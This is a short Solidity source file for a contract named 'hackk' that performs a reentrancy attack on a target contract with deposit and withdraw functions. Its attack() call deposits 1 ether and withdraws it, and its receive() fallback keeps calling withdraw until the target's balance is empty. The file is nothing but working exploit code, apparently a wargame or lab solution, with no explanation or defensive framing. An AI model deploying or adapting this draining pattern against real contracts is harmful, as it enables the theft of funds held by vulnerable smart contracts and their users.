pragma solidity ^0.8;

interface Reent{
  function deposit(address) external payable;
  function withdraw(uint256) external;
}
contract hackk{
  Reent private immutable target;
  constructor(address _target){
    target = Reent(_target);
  }
  function attack() external payable{
    target.deposit{value: 1e18}(address(this));
    target.withdraw(1e18);

  }
  receive() external payable{
    uint amount = min(1e18, address(target).balance);
    if(amount>0){
      target.withdraw(amount);
    }
  }
  function min(uint x, uint y) private pure returns(uint){
    return x <= y ? x : y;
  }
}